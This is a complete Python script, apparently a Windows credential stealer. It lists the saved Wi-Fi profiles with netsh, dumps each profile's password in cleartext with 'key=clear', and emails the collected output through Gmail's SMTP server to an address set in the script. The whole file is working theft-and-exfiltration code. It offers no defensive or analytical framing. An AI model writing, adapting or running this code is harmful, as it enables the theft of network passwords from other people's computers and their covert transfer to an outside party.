import subprocess
from smtplib import SMTP
import re
import locale
from typing import List


class CatchWifiPasswords(object):
   def __init__(self, /) -> None:
      self.email: str = ""
      self.password: str = ""
      self.run()


   def send_mail(self, message: bytes, /) -> None:
      with SMTP("smtp.gmail.com", 587) as server:
         try:
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            print("[+] ALL PASSWORDS WERE SENT")
         except Exception as e:
            print(f"[-] ERROR: {e}")

   
   def get_all_wifi_passwords(self, network_names: List[bytes], /) -> None:
      result: bytes = b""
      for network_name in network_names:
         command: str = f"netsh wlan show profile {network_name.rstrip().decode()} key=clear"
         current_result: bytes = subprocess.check_output(command, shell=True)
         result += current_result
      self.send_mail(result)


   def run(self, /) -> None:
      command: str = "netsh wlan show profile"
      networks: bytes = subprocess.check_output(command, shell=True)
      
      if (loc := locale.getlocale())[0] == "pt_BR":
         network_names = re.findall(b"(?:Usu\xa0rios\s*:\s)(.*)", networks)
         self.get_all_wifi_passwords(network_names)
      elif (loc := locale.getlocale())[0] == "en_US":
         network_names = re.findall(b"(?:Profile\s*:\s)(.*)", networks)
         self.get_all_wifi_passwords(network_names)
      else:
         print("[-] YOUR COMPUTER LANGUAGE IS DIFFERENT FROM PT-BR OR EN-US")
      

if __name__ == "__main__":
   catch = CatchWifiPasswords()